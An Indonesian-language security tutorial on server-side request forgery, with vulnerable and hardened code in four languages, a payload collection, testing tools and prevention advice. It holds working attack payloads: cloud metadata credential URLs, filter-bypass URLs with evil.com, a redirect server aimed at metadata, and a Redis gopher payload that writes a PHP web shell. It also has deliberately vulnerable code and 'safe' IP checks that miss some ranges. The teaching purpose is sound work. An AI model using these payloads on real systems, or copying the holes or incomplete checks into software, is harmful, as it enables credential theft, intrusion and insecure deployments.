# Server-Side Request Forgery (SSRF)

## Pengertian

Server-Side Request Forgery (SSRF) adalah kerentanan keamanan yang terjadi ketika penyerang dapat memanipulasi server untuk membuat permintaan HTTP ke sumber daya yang tidak dimaksudkan. Dengan kata lain, penyerang memanfaatkan server sebagai "proxy" untuk mengakses layanan internal atau eksternal.

**Analogi:** Bayangkan seorang resepsionis kantor yang menerima permintaan dari tamu untuk mengambil dokumen dari ruang arsip. Jika resepsionis tidak memverifikasi apakah tamu berhak mengakses dokumen tersebut dan langsung mengambilnya, tamu bisa meminta dokumen rahasia yang seharusnya tidak dapat mereka akses sendiri.

## Contoh Source Code yang Rentan SSRF

### 1. PHP - URL Fetcher

**Kode Rentan:**
```php
<?php
// BAHAYA: Input pengguna langsung digunakan untuk membuat permintaan HTTP
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;
?>

<!-- Penggunaan -->
<a href="?url=https://example.com">Example</a>
<a href="?url=https://api.github.com">GitHub API</a>
```

**Kode Aman:**
```php
<?php
$url = $_GET['url'];

// AMAN: Validasi URL dengan whitelist domain
$allowed_domains = ['example.com', 'api.github.com'];
$parsed_url = parse_url($url);

if (!in_array($parsed_url['host'], $allowed_domains)) {
    die("Domain not allowed");
}

// AMAN: Pastikan bukan IP internal
$ip = gethostbyname($parsed_url['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die("Internal IP addresses are not allowed");
}

$response = file_get_contents($url);
echo $response;
?>
```

### 2. Python (Flask) - Webhook Service

**Kode Rentan:**
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    # BAHAYA: Input pengguna langsung digunakan untuk membuat permintaan HTTP
    response = requests.get(url)
    return response.text

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request
import requests
import socket

app = Flask(__name__)

# AMAN: Whitelist domain yang diizinkan
ALLOWED_DOMAINS = ['example.com', 'api.github.com', 'jsonplaceholder.typicode.com']

def is_internal_ip(hostname):
    """Periksa apakah hostname mengarah ke IP internal"""
    try:
        ip = socket.gethostbyname(hostname)
        # Periksa IP private, loopback, dan link-local
        if ip.startswith(('10.', '172.16.', '172.17.', '172.18.', 
                          '172.19.', '172.20.', '172.21.', '172.22.',
                          '172.23.', '172.24.', '172.25.', '172.26.',
                          '172.27.', '172.28.', '172.29.', '172.30.',
                          '172.31.', '192.168.', '127.', '0.0.')):
            return True
        return False
    except socket.gaierror:
        return True

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    
    # AMAN: Parse dan validasi URL
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    # Pastikan menggunakan HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        return "Invalid scheme", 400
    
    # Validasi domain
    if parsed.hostname not in ALLOWED_DOMAINS:
        return "Domain not allowed", 403
    
    # Periksa apakah bukan IP internal
    if is_internal_ip(parsed.hostname):
        return "Internal IP addresses are not allowed", 403
    
    response = requests.get(url, timeout=5)
    return response.text

if __name__ == "__main__":
    app.run(debug=True)
```

### 3. Node.js (Express) - Image Proxy

**Kode Rentan:**
```javascript
const express = require('express');
const axios = require('axios');
const app = express();

app.get('/proxy', async (req, res) => {
    const url = req.query.url;
    // BAHAYA: Input pengguna langsung digunakan untuk membuat permintaan HTTP
    try {
        const response = await axios.get(url);
        res.send(response.data);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const axios = require('axios');
const dns = require('dns');
const { URL } = require('url');
const app = express();

// AMAN: Whitelist domain
const ALLOWED_DOMAINS = ['example.com', 'api.github.com', 'images.unsplash.com'];

function isInternalIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) return resolve(true); // Jika error, anggap internal
            
            // Periksa IP private
            const isInternal = (
                address.startsWith('10.') ||
                address.startsWith('172.16.') ||
                address.startsWith('172.17.') ||
                address.startsWith('172.18.') ||
                address.startsWith('172.19.') ||
                address.startsWith('172.20.') ||
                address.startsWith('172.21.') ||
                address.startsWith('172.22.') ||
                address.startsWith('172.23.') ||
                address.startsWith('172.24.') ||
                address.startsWith('172.25.') ||
                address.startsWith('172.26.') ||
                address.startsWith('172.27.') ||
                address.startsWith('172.28.') ||
                address.startsWith('172.29.') ||
                address.startsWith('172.30.') ||
                address.startsWith('172.31.') ||
                address.startsWith('192.168.') ||
                address.startsWith('127.') ||
                address.startsWith('0.0.') ||
                address === 'localhost'
            );
            resolve(isInternal);
        });
    });
}

app.get('/proxy', async (req, res) => {
    const url = req.query.url;
    
    try {
        const parsedUrl = new URL(url);
        
        // Validasi scheme
        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
            return res.status(400).send('Invalid scheme');
        }
        
        // Validasi domain
        if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
            return res.status(403).send('Domain not allowed');
        }
        
        // Periksa IP internal
        const isInternal = await isInternalIP(parsedUrl.hostname);
        if (isInternal) {
            return res.status(403).send('Internal IP addresses are not allowed');
        }
        
        const response = await axios.get(url, { timeout: 5000 });
        res.send(response.data);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

app.listen(3000);
```

### 4. Java (Spring Boot) - URL Preview

**Kode Rentan:**
```java
@RestController
public class PreviewController {
    
    @GetMapping("/preview")
    public String previewUrl(@RequestParam String url) throws Exception {
        // BAHAYA: Input pengguna langsung digunakan untuk membuat permintaan HTTP
        URL targetUrl = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
        conn.setRequestMethod("GET");
        
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(conn.getInputStream())
        );
        
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        
        return response.toString();
    }
}
```

**Kode Aman:**
```java
@RestController
public class PreviewController {
    
    private static final List<String> ALLOWED_DOMAINS = Arrays.asList(
        "example.com", "api.github.com"
    );
    
    private boolean isInternalIP(String hostname) {
        try {
            InetAddress address = InetAddress.getByName(hostname);
            return address.isSiteLocalAddress() || address.isLoopbackAddress();
        } catch (UnknownHostException e) {
            return true;
        }
    }
    
    @GetMapping("/preview")
    public ResponseEntity<String> previewUrl(@RequestParam String url) {
        try {
            URL targetUrl = new URL(url);
            String host = targetUrl.getHost();
            
            // Validasi domain
            if (!ALLOWED_DOMAINS.contains(host)) {
                return ResponseEntity.status(403).body("Domain not allowed");
            }
            
            // Periksa IP internal
            if (isInternalIP(host)) {
                return ResponseEntity.status(403).body("Internal IP addresses are not allowed");
            }
            
            HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream())
            );
            
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            
            return ResponseEntity.ok(response.toString());
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Error fetching URL");
        }
    }
}
```

## Mekanisme Kerentanan

SSRF terjadi ketika aplikasi web mengambil URL atau endpoint dari input pengguna tanpa validasi yang memadai. Server kemudian membuat permintaan HTTP ke URL tersebut, yang dapat mengarah ke:

1. **Layanan internal** -- Database, cache, atau API internal yang tidak seharusnya dapat diakses dari luar
2. **Metadata cloud** -- Endpoint metadata pada layanan cloud (AWS, GCP, Azure)
3. **File lokal** -- Menggunakan protokol `file://` untuk membaca file sistem
4. **Server lain di jaringan internal** -- Port scanning dan akses layanan internal

### Contoh Eksploitasi

**Permintaan normal:**
```
GET /fetch?url=https://api.example.com/data
```
**Hasil:**
```json
{"data": "public information"}
```

**Permintaan dengan SSRF:**
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```
**Hasil:**
```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
...
```

Ketika server merespons dengan metadata, ini mengindikasikan kerentanan SSRF yang dapat dieksploitasi untuk mengakses informasi sensitif.

## Dampak

SSRF dapat mengakibatkan:

- **Akses ke Layanan Internal** -- Penyerang dapat mengakses database, cache, atau API internal
- **Pencurian Metadata Cloud** -- Metadata AWS, GCP, atau Azure dapat diakses
- **Port Scanning** -- Penyerang dapat memindai port di jaringan internal
- **Bypass Firewall** -- Permintaan berasal dari server yang dipercaya, bukan dari luar
- **Remote Code Execution** -- Dalam kasus tertentu, SSRF dapat mengarah ke RCE

## Jenis-jenis SSRF

### 1. Basic SSRF

Penyerang dapat melihat respons dari permintaan yang dibuat server.

**Contoh:**
```
GET /fetch?url=http://internal-api.local/users
```
Server mengembalikan data dari `internal-api.local` kepada penyerang.

### 2. Blind SSRF

Penyerang tidak dapat melihat respons, tetapi dapat menyimpulkan apakah permintaan berhasil.

**Contoh:**
```
GET /fetch?url=http://internal-api.local/webhook
```
Penyerang hanya tahu apakah permintaan berhasil atau gagal berdasarkan waktu respons atau status code.

### 3. SSRF dengan Protokol Berbeda

Penyerang dapat menggunakan protokol selain HTTP/HTTPS.

**Protokol yang dapat dieksploitasi:**
```
file:///etc/passwd
dict://internal-redis:6379/INFO
gopher://internal-service:8080/
ftp://internal-ftp/file.txt
```

## Kumpulan Payload SSRF

### Payload Dasar

Payload ini digunakan untuk mengidentifikasi apakah aplikasi rentan SSRF:

```
http://example.com
https://example.com
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
```

### Payload untuk Akses Layanan Internal

**Metadata AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Metadata AWS ECS:**
```
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/metadata/task
```

**Metadata Google Cloud (GCP):**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
**Catatan:** GCP memerlukan header `Metadata-Flavor: Google`

**Metadata Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2020-06-01
http://169.254.169.254/metadata/instance/network?api-version=2020-06-01
http://169.254.169.254/metadata/instance/compute?api-version=2020-06-01
```
**Catatan:** Azure memerlukan header `Metadata: true`

**Layanan Internal Umum:**
```
http://localhost:8080
http://localhost:3000
http://localhost:6379 (Redis)
http://localhost:27017 (MongoDB)
http://localhost:9200 (Elasticsearch)
http://localhost:5432 (PostgreSQL)
http://localhost:3306 (MySQL)
http://localhost:11211 (Memcached)
http://localhost:8500 (Consul)
http://localhost:2379 (etcd)
```

### Payload Bypass Filter

**Jika `localhost` diblokir:**
```
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://127.0.0.1.nip.io
http://localtest.me
http://lvh.me
http://127.1
http://0177.0.0.1 (oktal)
http://2130706433 (desimal)
```

**Jika IP internal diblokir:**
```
http://127.0.0.1:80@evil.com
http://evil.com:80#127.0.0.1
http://127.0.0.1%40evil.com
http://evil.com%2F@127.0.0.1
```

**Redirect-based SSRF:**
```
1. Buat server yang redirect ke IP internal
2. Server target mengikuti redirect
3. Permintaan akhir mengarah ke IP internal
```

**Contoh redirect server (Python):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

**DNS Rebinding:**
```
1. Daftarkan domain yang mengarah ke IP penyerang
2. Setelah beberapa saat, ubah DNS ke IP internal
3. Server target membuat permintaan kedua ke IP internal
```

**Menggunakan DNS Rebinding tools:**
```
https://lock.cmpxchg8b.com/rebinder.html
http://rbndr.us
```

### Payload dengan Protokol Berbeda

**File protocol:**
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/config.php
```

**Dict protocol (Redis):**
```
dict://localhost:6379/INFO
dict://localhost:6379/CONFIG SET dir /var/www/html
dict://localhost:6379/CONFIG SET dbfilename shell.php
dict://localhost:6379/SET mykey "myvalue"
```

**Dict protocol (Memcached):**
```
dict://localhost:11211/stats
dict://localhost:11211/version
```

**Gopher protocol:**
```
gopher://localhost:9000/_<payload>
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**FTP protocol:**
```
ftp://localhost:21/
ftp://internal-ftp-server/file.txt
```

### Payload untuk Port Scanning

**Memindai port di jaringan internal:**
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
http://192.168.1.1:5432
http://192.168.1.1:6379
http://192.168.1.1:8080
http://192.168.1.1:9200
http://192.168.1.1:27017
```

**Time-based port detection:**
```
-- Jika port terbuka, respons cepat
-- Jika port tertutup, timeout atau error
```

### Payload untuk Eksploitasi Layanan

**Redis:**
```
-- Menggunakan gopher://
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0afoo%0d%0a$32%0d%0a%0d%0a%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

-- Menggunakan dict://
dict://localhost:6379/INFO
```

**Elasticsearch:**
```
http://localhost:9200/_cluster/health
http://localhost:9200/_cat/indices
http://localhost:9200/_nodes
http://localhost:9200/_search?q=*
```

**Docker API:**
```
http://localhost:2375/version
http://localhost:2375/containers/json
http://localhost:2375/containers/create
http://localhost:2375/containers/{id}/start
```

**Kubernetes:**
```
http://localhost:8080/api/v1/namespaces
http://localhost:8080/api/v1/pods
http://localhost:8080/api/v1/secrets
```

**Consul:**
```
http://localhost:8500/v1/catalog/services
http://localhost:8500/v1/kv/
http://localhost:8500/v1/agent/self
```

## Tools untuk Pengujian SSRF

### 1. Burp Suite

Burp Suite dapat digunakan untuk pengujian SSRF secara manual:

- **Collaborator** -- Mendeteksi Blind SSRF melalui callback
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi SSRF secara otomatis

**Penggunaan Collaborator untuk Blind SSRF:**
```
1. Buat Collaborator payload di Burp
2. Gunakan URL: http://<collaborator-id>.burpcollaborator.net
3. Jika server membuat permintaan, Collaborator akan mencatatnya
4. Analisis interaksi DNS dan HTTP
```

### 2. Interactsh

Interactsh adalah alat untuk mendeteksi Blind SSRF dan kerentanan out-of-band lainnya.

**Instalasi:**
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

**Penggunaan:**
```bash
-- Mendapatkan URL callback
interactsh-client

-- Output akan memberikan URL unik
-- Gunakan URL tersebut sebagai payload SSRF
-- Interaksi akan dicatat dan ditampilkan
```

### 3. See-SURF

See-SURF adalah alat untuk mendeteksi SSRF.

**Instalasi:**
```bash
git clone https://github.com/In3tinct/See-SURF.git
cd See-SURF
pip install -r requirements.txt
```

**Penggunaan:**
```bash
-- Menguji URL untuk SSRF
python see-surf.py -u 'http://target.com/fetch?url=FUZZ'
```

### 4. SSRFmap

SSRFmap adalah alat untuk memetakan dan mengeksploitasi SSRF.

**Instalasi:**
```bash
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
pip install -r requirements.txt
```

**Penggunaan:**
```bash
-- Eksploitasi SSRF
python ssrfmap.py -r request.txt -p url -m portscan

-- Menggunakan modul Redis
python ssrfmap.py -r request.txt -p url -m redis

-- Menggunakan modul portscan
python ssrfmap.py -r request.txt -p url -m portscan,fastscan
```

### 5. Gopherus

Gopherus adalah alat untuk menghasilkan payload Gopher untuk eksploitasi SSRF.

**Instalasi:**
```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
python gopherus.py --help
```

**Penggunaan:**
```bash
-- Generate payload untuk MySQL
python gopherus.py --gen mysql

-- Generate payload untuk Redis
python gopherus.py --gen redis

-- Generate payload untuk FastCGI
python gopherus.py --gen fastcgi

-- Generate payload untuk SMTP
python gopherus.py --gen smtp
```

### 6. AWS Metadata Tools

**Alat untuk mengakses metadata AWS:**
```bash
-- Menggunakan curl
curl http://169.254.169.254/latest/meta-data/

-- Menggunakan IMDSv2 (AWS terbaru)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### 7. PayloadsAllTheThings

Repositori lengkap berisi payload SSRF:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan SSRF:

1. **Uji dengan URL eksternal** -- Input `http://example.com` dan lihat apakah server mengambil konten
2. **Uji dengan localhost** -- Coba `http://localhost` atau `http://127.0.0.1`
3. **Uji dengan metadata cloud** -- Coba `http://169.254.169.254/latest/meta-data/`
4. **Uji Blind SSRF** -- Gunakan Collaborator atau Interactsh untuk mendeteksi permintaan
5. **Uji berbagai protokol** -- Coba `file://`, `dict://`, `gopher://`
6. **Perhatikan waktu respons** -- Perbedaan waktu dapat mengindikasikan port scanning

## Metode Pencegahan

1. **Gunakan whitelist domain** -- Hanya izinkan permintaan ke domain yang sudah ditentukan
   
   ```python
   ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']
   
   parsed = urlparse(url)
   if parsed.hostname not in ALLOWED_DOMAINS:
       return "Domain not allowed", 403
   ```

2. **Blokir IP internal** -- Pastikan server tidak dapat mengakses IP private atau loopback
   
   ```python
   def is_internal_ip(hostname):
       try:
           ip = socket.gethostbyname(hostname)
           return ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback
       except:
           return True
   ```

3. **Nonaktifkan protokol yang tidak diperlukan** -- Hanya izinkan HTTP dan HTTPS
   
   ```python
   if parsed.scheme not in ['http', 'https']:
       return "Invalid scheme", 400
   ```

4. **Validasi URL secara menyeluruh** -- Parse URL dan validasi setiap komponen
   
   ```python
   from urllib.parse import urlparse
   
   parsed = urlparse(url)
   
   # Validasi scheme
   if parsed.scheme not in ['http', 'https']:
       return "Invalid scheme", 400
   
   # Validasi hostname
   if not parsed.hostname:
       return "Invalid URL", 400
   
   # Periksa DNS rebinding
   ip = socket.gethostbyname(parsed.hostname)
   if is_internal_ip(parsed.hostname):
       return "Internal IP not allowed", 403
   ```

5. **Gunakan network segmentation** -- Pisahkan server yang membuat permintaan eksternal dari jaringan internal

6. **Terapkan autentikasi pada layanan internal** -- Pastikan layanan internal memerlukan autentikasi

7. **Disable IMDSv1, gunakan IMDSv2** -- Pada AWS, gunakan Instance Metadata Service v2 yang lebih aman
   
   ```bash
   -- IMDSv2 memerlukan token
   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
   curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
   ```

8. **Gunakan timeout yang ketat** -- Batasi waktu permintaan untuk mencegah time-based attacks
   
   ```python
   response = requests.get(url, timeout=5)
   ```

9. **Log dan monitor permintaan** -- Catat semua permintaan yang dibuat server dan pantau aktivitas mencurigakan

## Latihan Praktis

Silakan lanjutkan ke direktori latihan untuk eksplorasi lebih lanjut.

## Referensi Lanjutan

- OWASP Server-Side Request Forgery
- CWE-918: Server-Side Request Forgery (SSRF)
- PortSwigger: Server-Side Request Forgery (SSRF) -- https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings SSRF -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- SSRFmap -- https://github.com/swisskyrepo/SSRFmap
- Gopherus -- https://github.com/tarunkant/Gopherus
- AWS IMDSv2 Documentation -- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
